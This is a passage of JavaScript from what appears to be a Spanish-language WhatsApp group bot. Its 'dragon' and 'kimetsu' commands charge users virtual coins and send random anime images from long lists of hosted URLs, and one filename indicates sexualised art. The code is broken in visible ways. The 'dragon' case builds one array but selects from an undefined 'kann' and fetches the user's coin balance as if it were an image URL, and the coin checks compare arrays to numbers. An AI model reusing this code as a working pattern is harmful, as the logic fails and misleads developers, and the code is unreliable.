'https://i.ibb.co/8gd1k2J/716a263039a7f956d92c25a001eeb1d6.jpg',
'https://i.ibb.co/gr5RPpf/572c774a23582bdb0f979ea0eb421b7b.jpg',
'https://i.ibb.co/X8xrP1F/535faf663132e054e5351838ab70b780.jpg',
'https://i.ibb.co/0BLsbQn/534b72a16f9842c92fde8e33387dea51.jpg',
'https://i.ibb.co/80hqGhM/514c7e01362d0f8b3dd117e383dbc647-auto-x2.jpg',
'https://i.ibb.co/NNb1Vdt/404f8e9d74a07fe13bc1815e6eec45e5.jpg',
'https://i.ibb.co/YDw5Vz8/098c0d68eaf6d0b264971a9ab2004b70.jpg',
'https://i.ibb.co/Mcgt459/89d6e50f2dcbc20aa5650b57ea57bfa7.jpg',
'https://i.ibb.co/sHgnFk9/87b252597a9c60248b0ebd1e5ce9bafa.jpg',
'https://i.ibb.co/x6nvRss/69f68f6771599ef649a9d59535a2931d.jpg',
'https://i.ibb.co/KGBKsKT/63edec369331b8ed7f5c3f678a457ef9.jpg',
'https://i.ibb.co/MgHyB6L/56b1a7d7791ce46b461d5cdbe9b8db46.jpg',
'https://i.ibb.co/jhD6XBM/52fc45d285227aaf588896cc91c7ab4a.jpg',
'https://i.ibb.co/84cdCWL/48cdbe6d211bb7a6dc8ef0d59c8eab44-auto-x2.jpg',
'https://i.ibb.co/JjX4vv7/39a13f0452ab5ca0edf3729d23df7e8e.jpg',
'https://i.ibb.co/NFbXRdJ/36e9bee57233884327075e3d6163d72e.jpg',
'https://i.ibb.co/TY6LTZB/29a85262318b3be4729f10f7dd346407.jpg',
'https://i.ibb.co/t4st7rm/21b1c8955edfa8179e2ad25a38f0e097.jpg',
'https://i.ibb.co/pyfb1sS/9fdcd736ede6536705755efa56d4af02.jpg',
'https://i.ibb.co/dj0vYvx/6e7a5cd44f85344d6497d205d3652a4e.jpg',
'https://i.ibb.co/pPbDdyf/6bd2935a30901562d08fde6c36ea5d96.jpg',
'https://i.ibb.co/Xtmxf6N/5ea947819ad1e7bcc7bd38ceefa61ecc.jpg',
'https://i.ibb.co/WVSSWC8/5e514ac1e4e1f72c5dffe521d51ba0bd.jpg',
'https://i.ibb.co/rmwsNnB/5c5297f551994c496eece36c421058b3.jpg',
'https://i.ibb.co/ys9gNMD/5beee528daa86033d2e220ade023791c-auto-x2.jpg',
'https://i.ibb.co/sVg0MYZ/4ec132326db82631cb7b11f4207d13a8-auto-x2.jpg',
'https://i.ibb.co/GMDX5B1/4e41872dd23395a09e0a84c7029f7520.jpg',
'https://i.ibb.co/fnD0sR6/4b54366f3763879c907abb4776d9ae0a.jpg',
'https://i.ibb.co/7g1X0gs/3c6acdc67cf0dbc3a7adc3611ba0c53c-auto-x2.jpg',
'https://i.ibb.co/S7LZkPZ/2e21800a86e94df876b1a7da66873b9d-auto-x2.jpg',
'https://i.ibb.co/YQ7z75L/2d01ce7ea04619cd192efe2f16a9ca25.jpg',
'https://i.ibb.co/CWLXnXr/2a064916b24f35933d67b71beb1153db.jpg',
'https://i.ibb.co/TTQ9Jkw/1e227b8d7650815f95030ca836c7b651.jpg',
'https://i.ibb.co/cD16jbm/1bb3c6f6c7408f782afe0e2edb763cc3-auto-x2.jpg',
'https://i.ibb.co/T89Kv5v/pan-dragon-ball-and-1-more-drawn-by-konpeto-04fed04b69cd5b0a1f8c4c6e9fd4b34d-digital-art-x4.jpg',
'https://i.ibb.co/p3yhqwv/0b67efe3c34497cf5f5aa9c796e88168.jpg']
let zuper = dragon[Math.floor(Math.random() * dragon.length)]
      dbz = await getBuffer(zuper)
cnf.sendMessage(from, dbz, image, {quote: mek, caption: 'Se te cobraron 20 coins'})
addFilter(from)
          break

case prefix+'dragon':
	if (isBanned) return  reply(mess.banned) 
      if (!isRegistered) return reply(ind.noregis())		
if (!isBotGroupAdmins) return reply(mess.only.Badmin)	  
      const drs = checkATMuser(sender)
      const thr = [`${drs}`]
      if (thr < 50) return reply(`Lo siento, coins insuficientes`)
      confirmATM(sender, 50)
const gen1 =['https://i.ibb.co/0yR8qjT/1632630264748.jpg',
'https://i.ibb.co/PZ7nM6h/77d3be4913e0ad95a1cf49c9feb5b37d.jpg',
'https://i.ibb.co/qpgPV2k/1628371218735.jpg',
'https://i.ibb.co/0Vx5BTS/1629768987771.jpg',
'https://i.ibb.co/pRtHP62/34894cc0f9c0ae35a501ab0e4ed2bf4c.jpg',
'https://i.ibb.co/gdJm3dL/1624075077554.jpg',
'https://i.ibb.co/Hp5d3zK/1629219866177.jpg',
'https://i.ibb.co/yPy9gw7/1628369154153.jpg',
'https://i.ibb.co/ZW7d5rH/1632628518043.jpg',
'https://i.ibb.co/L51w9xQ/IMG-20210401-111553.jpg',
'https://i.ibb.co/Jn56hDW/1628357516080.jpg',
'https://i.ibb.co/Mn6PKQ1/b343a426009371946525cf282cc40fa2.jpg',
'https://i.ibb.co/Bt88qJP/1628369357645.jpg',
'https://i.ibb.co/NLtt44h/1632114161918.jpg',
'https://i.ibb.co/NLtt44h/1632114161918.jpg',
'https://i.ibb.co/kmBTgp3/36dec0336e0ddac4a00780a71c935d40.jpg',
'https://i.ibb.co/7k9BfCX/1635872290572.jpg',
'https://i.ibb.co/Y0XqqnN/1635265160789.jpg',
'https://i.ibb.co/4MmwH2x/1635265160807.jpg',
'https://i.ibb.co/P5gmftB/1635265160795.jpg',
'https://i.ibb.co/xhLbxRP/1635265160801.jpg',
'https://i.ibb.co/wpfMXkw/e84f2f301e776a4e54b468755d1b3743.jpg',
'https://i.ibb.co/c1807LK/6561a5fab28608e90c9b205711b48c46.jpg',
'https://i.ibb.co/QNGSkv6/1632114161957.jpg',
'https://i.ibb.co/bHrbkks/1632114161928.jpg',
'https://i.ibb.co/yQTsBQR/1632114161947.jpg',
'https://i.ibb.co/StVHLDd/1630872258606.jpg',
'https://i.ibb.co/zfN2xQz/a6ade92505fb4e7fb8f7616db29ffe23.jpg',
'https://i.ibb.co/b5FyS4C/1635527063856.jpg',
'https://i.ibb.co/njNYQ2W/1635527063845.jpg',
'https://i.ibb.co/wS5wsMx/1628369674870.jpg',
'https://i.ibb.co/VCsHcHV/1635527063834.jpg',
'https://i.ibb.co/Fg8ZJMT/1628369808341.jpg',
'https://i.ibb.co/Lxk4msK/1628370309792.jpg',
'https://i.ibb.co/85KgmCv/f8048a60214a95ad70aaa1a566b1918b.jpg',
'https://i.ibb.co/XZTKqq2/1635527063840.jpg',
'https://i.ibb.co/qgjf9Fy/1635527063850.jpg',
'https://i.ibb.co/Y8g1Zpj/1486480af73675f4c310f8c9a5f9c3c2.jpg',
'https://i.ibb.co/k5x0hRK/20210923-101751-auto-x2.jpg',
'https://i.ibb.co/nRHcd06/6feb681aff4aa8fc646298f4f0529269.jpg',
'https://i.ibb.co/bXR8HN4/5bf9865bb24e84e5ffdc0c60002e724a.jpg',
'https://i.ibb.co/GCmFKTg/0612902de41af4d3f69c4b37762acd3c.jpg',
'https://i.ibb.co/wK0ntbW/1632114161908.jpg',
'https://i.ibb.co/9r1VgQ2/463f67e64962fedf8ec90b219ee285c5.jpg',
'https://i.ibb.co/r28BGyw/1632628147733.jpg',
'https://i.ibb.co/3ckhxgJ/8584550a05575486919126e9e9562754.jpg',
'https://i.ibb.co/283gkcj/1635271786714.jpg',
'https://i.ibb.co/t81mTgr/1624074247388.jpg',
'https://i.ibb.co/87RjQfR/1628285927272.jpg',
'https://i.ibb.co/gvFXNzK/463dad1f9d9f7f45f95297a1f35759a9.jpg',
'https://i.ibb.co/sRZgdSd/1635872290589.jpg',
'https://i.ibb.co/Y0vNvY6/1632114161849.jpg',
'https://i.ibb.co/DCxMCyy/1630084127364.jpg',
'https://i.ibb.co/t3z5KFh/1628286585526.jpg',
'https://i.ibb.co/zHjpzkb/ab7bb59668c765aede40a9c7b6f0fdfa-auto-x2.jpg',
'https://i.ibb.co/KFLvrZk/1627867509179.jpg',
'https://i.ibb.co/FnyBkKK/1632628147747.jpg',
'https://i.ibb.co/Z68Y5Wr/1628369389621.jpg',
'https://i.ibb.co/YNwRzmB/f7139ffbe0105994fbede9a0c6d86608.jpg',
'https://i.ibb.co/FWzwT8n/20210928-170924.jpg',
'https://i.ibb.co/9tY1rFf/1632628517993.jpg',
'https://i.ibb.co/7RNLR8r/1631251582101.jpg',
'https://i.ibb.co/Jy7pm79/1628370309729.jpg',
'https://i.ibb.co/m6mYpFr/1635303931860.jpg',
'https://i.ibb.co/YTtWTBj/1630875096969.jpg',
'https://i.ibb.co/kBsfw9d/20211008-082528.jpg',
'https://i.ibb.co/tBMxLzW/1628360564583.jpg',
'https://i.ibb.co/yQX5FNj/1632114161792.jpg',
'https://i.ibb.co/QdR2Wy4/1630872038606.jpg',
'https://i.ibb.co/wg86F1M/1628792354767.jpg',
'https://i.ibb.co/GvXq92M/c72e915e751df4510513ebd8688f488b.jpg',
'https://i.ibb.co/JdVNQVb/2c1f38d7fb888e13d27bab0875a1c0c1.jpg',
'https://i.ibb.co/6BStxhR/11a6bb1a817c650a7372ffe2db833a05.jpg',
'https://i.ibb.co/YfJjybW/1628360494090.jpg',
'https://i.ibb.co/3mKNmm5/1628300047106.jpg',
'https://i.ibb.co/J71X0Rf/1628360613584.jpg',
'https://i.ibb.co/vzK0BkN/3803ff62cc1170ae80c9efc0f566bb95.jpg',
'https://i.ibb.co/T1XqBDW/b569d5ab055b6a81bec2bf6c71ff6cbc.jpg',
'https://i.ibb.co/VT3ntLr/bc91174567fd93ea031dfc8db3e91c6d.jpg',
'https://i.ibb.co/VT3ntLr/bc91174567fd93ea031dfc8db3e91c6d.jpg',
'https://i.ibb.co/pb87Mq5/1628360613610.jpg',
'https://i.ibb.co/XZM8p6t/1628369674910.jpg',
'https://i.ibb.co/VQB48js/1632114161736.jpg',
'https://i.ibb.co/R6FmkQ8/1628369357599.jpg',
'https://i.ibb.co/YTqS8Cj/1628360564599.jpg',
'https://i.ibb.co/KWhw6qT/1630875096960.jpg',
'https://i.ibb.co/HFsSz2J/1632628517946.jpg',
'https://i.ibb.co/ZcC97Hv/20210910-091916.jpg',
'https://i.ibb.co/g6sDGgs/20210918-122053-auto-x2.jpg',
'https://i.ibb.co/ckBHjrL/95e2c671233a9687cc46ded428fde982.jpg',
'https://i.ibb.co/xJvhFXb/20210910-132139-auto-x2.jpg',
'https://i.ibb.co/1KHncnL/1635724647737.jpg',
'https://i.ibb.co/j6v413c/1628792288317.jpg',
'https://i.ibb.co/Hg6WSLR/1632114161838.jpg',
'https://i.ibb.co/TLkJPhx/1632624636615.jpg',
'https://i.ibb.co/bRBLZbm/ea638142d15f38bc079c09473568d404.jpg',
'https://i.ibb.co/bRBLZbm/ea638142d15f38bc079c09473568d404.jpg',
'https://i.ibb.co/2Z7KJ4J/1629843393364.jpg',
'https://i.ibb.co/yps9pCw/1629399995118.jpg',
'https://i.ibb.co/vDrMyZP/1632624312741.jpg',
'https://i.ibb.co/YhVhJT8/IMG-20210928-WA0170-auto-x2.jpg',
'https://i.ibb.co/1RP2249/1628226424969.jpg',
'https://i.ibb.co/rQ1STnp/671e19cc962ef9e1a68394e4778d89f0.jpg',
'https://i.ibb.co/PGfTZrQ/1628369912733.jpg',
'https://i.ibb.co/RjtVTTk/1628369154169.jpg',
'https://i.ibb.co/M917cDS/892de4491262756d7b543c3afbe6dbde.jpg',
'https://i.ibb.co/qx6nryV/1628226424986.jpg',
'https://i.ibb.co/sFrmvQz/32df00b36f2e1d86ff231e08d31d2325.jpg',
'https://i.ibb.co/j6c43QB/1624160754443.jpg',
'https://i.ibb.co/ZTZHz69/1628369733137.jpg',
'https://i.ibb.co/sCYk4N4/1624149974303.jpg',
'https://i.ibb.co/nDPw6P7/1632624312755.jpg',
'https://i.ibb.co/3fjjrst/1627864614124.jpg',
'https://i.ibb.co/1Qc9dc0/1628369154018.jpg',
'https://i.ibb.co/9VjvXtz/20210929-230335.jpg',
'https://i.ibb.co/zVjQ5sG/1a53bbccafc838c81a0ed0c8ed03bb65.jpg',
'https://i.ibb.co/R0D8T6b/20210929-230333.jpg',
'https://i.ibb.co/MnnKypM/1632114161889.jpg',
'https://i.ibb.co/BV1r4sY/1628300047078.jpg',
'https://i.ibb.co/fxqzYmM/5c4703858aea6fe2fb792fd66aef3dcd.jpg',
'https://i.ibb.co/cNwwKth/1629781483471.jpg',
'https://i.ibb.co/X7n9v2m/1632628518010.jpg',
'https://i.ibb.co/J7YGxkg/1628369425808.jpg',
'https://i.ibb.co/bvKtrxn/1628369733076.jpg',
'https://i.ibb.co/86Rnq36/1628369154064.jpg',
'https://i.ibb.co/cr7krwH/1628369154120.jpg',
'https://i.ibb.co/4TfLBzf/fdaaf9f24a6487185f47aef474fa96de.jpg',
'https://i.ibb.co/fkR1Jgq/1628300047092.jpg',
'https://i.ibb.co/5nvXGmJ/1636558793091.jpg',
'https://i.ibb.co/KxMdyFw/192ef382c006d80dd5e0ca2240eee267.jpg',
'https://i.ibb.co/cvm8DYd/1632114161898.jpg',
'https://i.ibb.co/rvmSqh0/1632114161859.jpg',
'https://i.ibb.co/TtC02nX/1629781483454.jpg',
'https://i.ibb.co/VCp2NNL/643ff5610b4cc5158f37ef8e6c70dece.jpg',
'https://i.ibb.co/KxVLjj7/1628369357629.jpg',
'https://i.ibb.co/Sf0FXqR/1630872038588.jpg',
'https://i.ibb.co/tKm49pK/1628369425794.jpg',
'https://i.ibb.co/f84pQby/1632628147760.jpg',
'https://i.ibb.co/gFQfpCj/1628357773435.jpg',
'https://i.ibb.co/Q6cX1b5/1628369154102.jpg',
'https://i.ibb.co/vdDvZ7D/1630352756274.jpg',
'https://i.ibb.co/SVsyJPp/Tooru-Mai-Dragon-Kobayashi-san-Chi-no-Maid-Dragon-Anime-Ero-Oppai-Anime-Ero-3640111.jpg',
'https://i.ibb.co/CVR5GYt/1628369154137.jpg',
'https://i.ibb.co/gwfQRdk/1632624312767.jpg',
'https://i.ibb.co/hVn4qz0/1630872038597.jpg',
'https://i.ibb.co/dBfKpzd/1632114161938.jpg',
'https://i.ibb.co/HTYmtTm/1628360564554.jpg',
'https://i.ibb.co/YX87rWw/1628371218681.jpg',
'https://i.ibb.co/2Mv0931/1628307460070.jpg',
'https://i.ibb.co/2MyGwGd/1628371218722.jpg',
'https://i.ibb.co/Ld2Z2MY/1627864614146.jpg',
'https://i.ibb.co/RyNnFVB/1635273962796.jpg',
'https://i.ibb.co/t2mCH5b/1628370309780.jpg',
'https://i.ibb.co/nwG6CHX/1629843123374.jpg',
'https://i.ibb.co/hMQft9J/1629781483407.jpg',
'https://i.ibb.co/m8WrVmh/1632624312780.jpg',
'https://i.ibb.co/xXLBqhP/21e80d06c81b492c7b192b2562e93418.jpg',
'https://i.ibb.co/9qNbBVv/3596b3ed4d0edf1ff425b945f0b00045.jpg',
'https://i.ibb.co/XW6XLXP/1630352756283.jpg',
'https://i.ibb.co/m5y1rfd/1630875096951.jpg',
'https://i.ibb.co/x81vrqc/1629843123360.jpg',
'https://i.ibb.co/0ZTnV0R/20210928-213153.jpg',
'https://i.ibb.co/72ZbbQf/1635892101664.jpg',
'https://i.ibb.co/tzpFZwK/1632628518035.jpg',
'https://i.ibb.co/jTnCNZr/1636482226814.jpg',
'https://i.ibb.co/wYTzGK0/98ea82128348109c312c3ddc13f2f137.jpg',
'https://i.ibb.co/TBzDqJG/ba4e6299d09b5b7a6e627477bf019152.jpg',
'https://i.ibb.co/cyGhk2P/67c1255506e8e3e6b7e70e0a6a45e3bf.jpg',
'https://i.ibb.co/5FxG2SC/1629219866200.jpg',
'https://i.ibb.co/vYPxT85/1632629601560.jpg',
'https://i.ibb.co/tcSmrQr/555520b9c992e9d1a47de8df44361ab4.jpg',
'https://i.ibb.co/JHKBh8j/1624149974261.jpg',
'https://i.ibb.co/PWWfYLv/1632114161779.jpg',
'https://i.ibb.co/0Yf6M4W/1632630184416.jpg',
'https://i.ibb.co/k865c9T/244105ae58e7aec930edd8e065ac82ae.jpg',
'https://i.ibb.co/XtwLZxc/1628369357660.jpg',
'https://i.ibb.co/7JmcmdH/6f63aff3c41498c1dea8c079ff271e43.jpg',
'https://i.ibb.co/txFnLy6/1628369733032.jpg',
'https://i.ibb.co/prdTnSd/1628792288304.jpg',
'https://i.ibb.co/r07TwMp/1635566646676.jpg',
'https://i.ibb.co/fYHWtDL/1632628611750.jpg',
'https://i.ibb.co/Jz17zkX/12ebd69e5d3e8bc41a934214533b58ba.jpg',
'https://i.ibb.co/fSqwhFj/7926d261002e9502cb103f6fa0b118f6.jpg',
'https://i.ibb.co/PY0JfFw/1624074755517.jpg',
'https://i.ibb.co/PY0JfFw/1624074755517.jpg',
'https://i.ibb.co/x8vfPrx/1632114161706.jpg',
'https://i.ibb.co/FbWWrTy/090aa4ed32d3d3b92fc5ce70ac986d7f.jpg',
'https://i.ibb.co/Lnn6dbd/1262ad36e7e602710c72444bd268656c.jpg',
'https://i.ibb.co/d5BSXTh/1629781483436.jpg',
'https://i.ibb.co/QDqgczs/1624149974275.jpg',
'https://i.ibb.co/hCtKMWh/b5ebe83e830341d02e1c54d7c7072aac.jpg',
'https://i.ibb.co/5nCxjHK/1628360700848.jpg',
'https://i.ibb.co/m8f93WH/53e93c381cbc0470aab7eafac29ecee2.jpg',
'https://i.ibb.co/pwMY0JT/1632114161721.jpg',
'https://i.ibb.co/GdSZbPM/IMG-20210928-WA0174-auto-x2.jpg',
'https://i.ibb.co/4MSM4hB/1635566646679.jpg',
'https://i.ibb.co/P558F72/20211023-184249.jpg',
'https://i.ibb.co/VSXRDyV/1628309477516.jpg',
'https://i.ibb.co/5BrDMC9/1632628518027.jpg',
'https://i.ibb.co/ZK1SFC9/1632628517955.jpg',
'https://i.ibb.co/2n84BH2/1628371218748.jpg',
'https://i.ibb.co/FsCMLRn/1630082922965.jpg',
'https://i.ibb.co/tpkFbwV/1ed94aa2fd79d6cb7076050469361232.jpg',
'https://i.ibb.co/FgGnTDm/1628369154184.jpg',
'https://i.ibb.co/89Mz9x7/1624075101438.jpg',
'https://i.ibb.co/MnndnPF/1628369154198.jpg',
'https://i.ibb.co/jg8kGTk/1628371218761.jpg',
'https://i.ibb.co/dGxqLW2/1628371491639.jpg',
'https://i.ibb.co/xKZVST4/1632114161869.jpg',
'https://i.ibb.co/R6GQt82/20211023-184236.jpg',
'https://i.ibb.co/PGxkNyZ/1628370309754.jpg',
'https://i.ibb.co/rphD3xG/1632114161879.jpg',
'https://i.ibb.co/TrKG2bH/1d202491234848e16e859ee691f2340a.jpg',
'https://i.ibb.co/pdWJrcW/1636482226823.jpg',
'https://i.ibb.co/hXFP2V3/1628369154084.jpg',
'https://i.ibb.co/G7CYjb8/1628379140796.jpg',
'https://i.ibb.co/DG4ryHY/1628357516102.jpg',
'https://i.ibb.co/FYqVBhv/1629781483421.jpg',
'https://i.ibb.co/TktyGM9/1628370309742.jpg',
'https://i.ibb.co/WynXcjD/1629779149459.jpg',
'https://i.ibb.co/NYxZStZ/IMG-20210928-WA0173-auto-x2.jpg',
'https://i.ibb.co/PYPM9mW/1632628518051.jpg',
'https://i.ibb.co/M9Z7K6L/1628226424933.jpg',
'https://i.ibb.co/9q9ZVjj/1628369674897.jpg',
'https://i.ibb.co/4tKKmv0/1632628518001.jpg',
'https://i.ibb.co/KWkQsgy/20210929-230338.jpg',
'https://i.ibb.co/jRfhkNG/1632629601570.jpg',
'https://i.ibb.co/rfcz5LK/1628370309767.jpg',
'https://i.ibb.co/Jpx4bHm/c7f1d7a97a11f27983854dd6a0484ee3.jpg',
'https://i.ibb.co/Vj6K3Kk/20210929-230336.jpg',
'https://i.ibb.co/ZWCnnGs/1628369587832.jpg',
'https://i.ibb.co/ctsZ1vV/1630945262067.jpg',
'https://i.ibb.co/xjxsWy5/1630871709929.jpg',
'https://i.ibb.co/VQV359X/1628286080381.jpg',
'https://i.ibb.co/jgTRzyZ/IMG-20210217-WA0239-digital-art-x4.jpg',
'https://i.ibb.co/WpDDyVY/1628309477502.jpg',
'https://i.ibb.co/HB0rTR2/26.jpg',
'https://i.ibb.co/T8zSqLy/1627864614186.jpg',
'https://i.ibb.co/G95PqDh/1628286080398.jpg',
'https://i.ibb.co/MhVzXwV/1628369733108.jpg',
'https://i.ibb.co/VNy9Bwc/f96a3f92370df1b6dc616bbbc9ca767f.jpg',
'https://i.ibb.co/PtXsZHd/1632114161815.jpg',
'https://i.ibb.co/2dsYDHc/74b50e61bcad8c403f412b5572c3e5c1.jpg',
'https://i.ibb.co/JR3h6NF/1628300047063.jpg',
'https://i.ibb.co/PC458n5/1632628277128.jpg',
'https://i.ibb.co/Chv0D3r/1628286080361.jpg',
'https://i.ibb.co/zX49pzv/1629768337254.jpg',
'https://i.ibb.co/rvJ4tYm/ac0253162d1799205864d63d575dcdf3.jpg',
'https://i.ibb.co/ysNVdr7/1632114161804.jpg',
'https://i.ibb.co/c2q9Cjc/20210927-003411.jpg',
'https://i.ibb.co/HX0M02S/1628369357703.jpg',
'https://i.ibb.co/5GygP24/127fbd6651c207caf369bf3537b33cdb.jpg',
'https://i.ibb.co/5GygP24/127fbd6651c207caf369bf3537b33cdb.jpg',
'https://i.ibb.co/M7mCL1k/1628286080415.jpg',
'https://i.ibb.co/VjJMvYV/1628360700825.jpg',
'https://i.ibb.co/cXSWZyk/0d3ca9c34b588ce2f20bff14c56ec99c.jpg',
'https://i.ibb.co/sgWh6Cx/1632628518018.jpg',
'https://i.ibb.co/934Z8Fk/1628792288330.jpg',
'https://i.ibb.co/K7TXMSw/1628288399245.jpg',
'https://i.ibb.co/NW4gn8W/1632628518068.jpg',
'https://i.ibb.co/kx2dZqt/1632630184407.jpg',
'https://i.ibb.co/5TG6fRb/1627864614166.jpg',
'https://i.ibb.co/d0XQqxV/1630083935865.jpg',
'https://i.ibb.co/56T1j2r/27f9d26f6cc5b77626faa942536aa4bc.jpg',
'https://i.ibb.co/PFhYbWb/1628285927291.jpg',
'https://i.ibb.co/8xJtpmV/1635566646673.jpg',
'https://i.ibb.co/pL3dM10/1628226425002.jpg',
'https://i.ibb.co/8K6gsvk/1629843323236.jpg',
'https://i.ibb.co/dpPrKk6/1628369912720.jpg',
'https://i.ibb.co/d0bD54X/9cebacdd815b73a7a89b1adb72f0fb12.jpg',
'https://i.ibb.co/qBgSwgB/1628379099061.jpg',
'https://i.ibb.co/BG5JTYB/1624072706489.jpg',
'https://i.ibb.co/1TGHL8D/1635271786725.jpg',
'https://i.ibb.co/9TCR6pJ/1632628277119.jpg',
'https://i.ibb.co/sFZFyzK/20.jpg',
'https://i.ibb.co/jzBZhb6/22.jpg',
'https://i.ibb.co/w7kXHFC/1632114161827.jpg',
'https://i.ibb.co/G263ZKp/1628369154043.jpg',
'https://i.ibb.co/Jr6mFKM/1632114161765.jpg',
'https://i.ibb.co/v3fRndW/1628369357689.jpg',
'https://i.ibb.co/Dw8dj8h/1629781376996.jpg',
'https://i.ibb.co/P6H36H4/1632114161751.jpg',
'https://i.ibb.co/DVz6XKd/17.jpg',
'https://i.ibb.co/jW7W8Dr/14.jpg',
'https://i.ibb.co/YXZGy8c/1635265160812.jpg',
'https://i.ibb.co/82hXZxF/1213592-76ffb8abb29866e06ec7d119c32dcbbe.jpg',
'https://i.ibb.co/N156QLb/23.jpg',
'https://i.ibb.co/TqBRfLR/21.jpg',
'https://i.ibb.co/0ZH8mpm/19.jpg',
'https://i.ibb.co/r0DTTZ0/1628369357674.jpg',
'https://i.ibb.co/3hMpFKB/1628357298885.jpg',
'https://i.ibb.co/8Y74VQQ/1635566646670.jpg',
'https://i.ibb.co/1zWBR8M/813.jpg',
'https://i.ibb.co/FJM6N22/1635271786719.jpg',
'https://i.ibb.co/C7VjWXp/1630084153438.jpg',
'https://i.ibb.co/mCdYXVQ/d6bfe2a606392e75fb9fa78ea5eed270.jpg',
'https://i.ibb.co/ggVqCch/1628369912746.jpg',
'https://i.ibb.co/Y8FXfp0/1632628518085.jpg',
'https://i.ibb.co/9r671QP/1632628518060.jpg',
'https://i.ibb.co/MnCnSP5/1636057792498.jpg',
'https://i.ibb.co/RB8DLGG/1628379072115.jpg',
'https://i.ibb.co/whXSSV6/24.jpg',
'https://i.ibb.co/27DH86x/1628369357614.jpg',
'https://i.ibb.co/XywBYVW/15.jpg',
'https://i.ibb.co/FW4vNHz/13.jpg',
'https://i.ibb.co/LrWFNBj/25.jpg',
'https://i.ibb.co/wYHyPjf/1628369786908.jpg',
'https://i.ibb.co/F3QCHnx/12.jpg',
'https://i.ibb.co/WKTXQPD/d2dea171748817b185cb872ba0613def.jpg',
'https://i.ibb.co/1GgsPfq/11.jpg']
let elm = kann[Math.floor(Math.random() * kann.length)]
      dragon = await getBuffer(drs)
cnf.sendMessage(from, dragon, image, {quote: mek, caption: 'Se te cobraron 50 coins'})
addFilter(from)
          break

case prefix+'kimetsu':
	if (isBanned) return  reply(mess.banned) 
      if (!isRegistered) return reply(ind.noregis())
if (!isBotGroupAdmins) return reply(mess.only.Badmin)			  
      const kim = checkATMuser(sender)
      const kim1 = [`${kim}`]
      if (kim1 < 30) return reply(`Lo siento, coins insuficientes`)
      confirmATM(sender, 30)
const kime =['https://i.ibb.co/BBrmWyn/99.jpg',
'https://i.ibb.co/34JDK0s/02.jpg',
'https://i.ibb.co/mRpwqHP/03.jpg',
'https://i.ibb.co/K7wVbY6/05.jpg',
'https://i.ibb.co/2ML6y44/06.jpg',
'https://i.ibb.co/FV4tF1N/07.jpg',
'https://i.ibb.co/HzDBj1r/08.jpg',
'https://i.ibb.co/z837NTg/09.jpg',
'https://i.ibb.co/JkT4Hbp/10.jpg',
'https://i.ibb.co/DLttyzQ/100.jpg',
'https://i.ibb.co/B6PjrtN/101.jpg',
'https://i.ibb.co/wM328G5/102.jpg',
'https://i.ibb.co/MD7VB5p/103.jpg',
'https://i.ibb.co/M1GxX94/104.jpg',
'https://i.ibb.co/87gJyXx/105.jpg',
'https://i.ibb.co/5Kym6Jm/106.jpg',
'https://i.ibb.co/BB8hTBv/107.jpg',
'https://i.ibb.co/PGmctvL/108.jpg',
'https://i.ibb.co/hC4Mgq4/109.jpg',
'https://i.ibb.co/Lht12DQ/11.jpg',
'https://i.ibb.co/2W2LWyJ/110.jpg',
'https://i.ibb.co/0KJ4N3M/111.jpg',
'https://i.ibb.co/4tXFrwr/112.jpg',
'https://i.ibb.co/cCFkT0y/113.jpg',
'https://i.ibb.co/KVkRTMj/114.jpg',
'https://i.ibb.co/dQyVR2W/115.jpg',
'https://i.ibb.co/Prggybw/116.jpg',
'https://i.ibb.co/wsPz2mQ/117.jpg',
'https://i.ibb.co/LPtYFSp/118.jpg',
'https://i.ibb.co/QYHDd7r/119.jpg',
'https://i.ibb.co/mhPsb3H/12.jpg',
'https://i.ibb.co/64dYJXK/120.jpg',
'https://i.ibb.co/Jrd8hVg/121.jpg',
'https://i.ibb.co/Q8xJ6vT/122.jpg',
'https://i.ibb.co/LdJkc6g/123.jpg',
'https://i.ibb.co/cb855ZJ/124.jpg',
'https://i.ibb.co/3CCHQ9G/125.jpg',
'https://i.ibb.co/Hrk0zGS/126.jpg',
'https://i.ibb.co/4mFKbsv/127.jpg',
'https://i.ibb.co/6n7hDJd/128.jpg',
'https://i.ibb.co/BVYCSCb/129.jpg',
'https://i.ibb.co/7JtYQXC/13.jpg',
'https://i.ibb.co/FzMqyP3/130.jpg',
'https://i.ibb.co/1dgYtmN/131.jpg',
'https://i.ibb.co/SnQB8F4/132.jpg',
'https://i.ibb.co/brth2Fd/133.jpg',
'https://i.ibb.co/dGyPcbZ/134.jpg',
'https://i.ibb.co/1bmkGyw/135.jpg',
'https://i.ibb.co/mHXK584/136.jpg',
'https://i.ibb.co/PGr65BV/137.jpg',
'https://i.ibb.co/TLzt0f6/138.jpg',
'https://i.ibb.co/F3dp1W5/139.jpg',
'https://i.ibb.co/TbbGHzd/14.jpg',
'https://i.ibb.co/n8T9z6K/140.jpg',
'https://i.ibb.co/FBKywXk/141.jpg',
'https://i.ibb.co/PYwFjpg/142.jpg',
'https://i.ibb.co/vYjG9wS/143.jpg',
'https://i.ibb.co/LCR9MF9/144.jpg',
'https://i.ibb.co/q0r0wBF/145.jpg',
'https://i.ibb.co/tpRbtys/146.jpg',
'https://i.ibb.co/jGRdw0p/147.jpg',
'https://i.ibb.co/qFf7Tzz/148.jpg',
'https://i.ibb.co/SQjtq6J/149.jpg',
'https://i.ibb.co/qJvVW9F/15.jpg',
'https://i.ibb.co/gJ3Lg3C/150.jpg',
'https://i.ibb.co/FbC3YVZ/151.jpg',
'https://i.ibb.co/jgjLwtk/152.jpg',
'https://i.ibb.co/KzpLRKD/153.jpg',
'https://i.ibb.co/FxTyHnn/154.jpg',
'https://i.ibb.co/7kQhrWK/155.jpg',
'https://i.ibb.co/7KycS7T/156.jpg',
'https://i.ibb.co/c21GnnD/157.jpg',
'https://i.ibb.co/L64CMn4/158.jpg',
'https://i.ibb.co/WfwxFGz/159.jpg',
'https://i.ibb.co/z8SDCrF/16.jpg',
'https://i.ibb.co/C9kTB0w/160.jpg',
'https://i.ibb.co/8BSCvHK/161.jpg',
'https://i.ibb.co/sRgPB0Y/162.jpg',
'https://i.ibb.co/GMCnBVt/163.jpg',
'https://i.ibb.co/hMTZFKr/164.jpg',
'https://i.ibb.co/sPf5TWS/165.jpg',
'https://i.ibb.co/6YcNgjt/166.jpg',
'https://i.ibb.co/Wn2rMj7/167.jpg',
'https://i.ibb.co/tHW0bNg/168.jpg',
'https://i.ibb.co/6yC3WZ7/169.jpg',
'https://i.ibb.co/T1YjFnW/17.jpg',
'https://i.ibb.co/6J4fBW3/170.jpg',
'https://i.ibb.co/644sTLp/171.jpg',
'https://i.ibb.co/4NQmGBV/172.jpg',
'https://i.ibb.co/nzWLdY4/173.jpg',
